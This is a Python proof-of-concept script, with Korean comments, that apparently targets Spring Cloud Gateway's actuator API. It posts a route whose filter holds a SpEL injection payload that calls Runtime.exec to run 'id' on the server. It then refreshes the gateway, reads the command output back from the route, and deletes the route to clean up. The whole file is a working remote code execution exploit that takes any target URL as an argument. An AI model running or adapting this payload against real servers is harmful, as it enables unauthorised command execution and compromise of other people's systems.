#!/usr/bin/env python
import sys
import requests
import json

def add_router(host) : #1단계 라우터 추가 
    url = f"{host}/actuator/gateway/routes/hacktest"
    print(url)
    headers = {
        "Content-Type": "application/json"
    }

    payload = {
        "id": "hacktest",
        "filters": [
            {
                "name": "AddResponseHeader",
                "args": {
                    "name": "Result",
                    "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
                }
            }
        ],
        "uri": "http://example.com"
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))

    print(response.status_code)

def refresh(host): #2,5단계 게이트웨이 새로고침
    url = f"{host}/actuator/gateway/refresh"
    print(url)
    response = requests.post(url)
    print(response.status_code)

def get_result(host): #3단계 공격 결과 출력
    url = f"{host}/actuator/gateway/routes/hacktest"
    print(url)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    response = requests.get(url,headers=headers)
    print(response.status_code)
    response_json = json.loads(response.text) #가시성을 위해 JSON 파싱
    print(json.dumps(response_json, indent=2))

def delete_router(host): #4단계 공격 라우터 삭제 
    url = f"{host}/actuator/gateway/routes/hacktest"
    print(url)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    response = requests.delete(url)
    print(response.status_code)
    print(response.text)

def poc(host):
    add_router(host)
    refresh(host)
    get_result(host)
    delete_router(host)
    refresh(host)

if __name__ == '__main__' :
    if len(sys.argv) < 2:
        print("잘못된 입력입니다.")
        print("사용법: python3 poc.py http://your-ip:8080")
        sys.exit()

    host = sys.argv[1]

    poc(host)

    
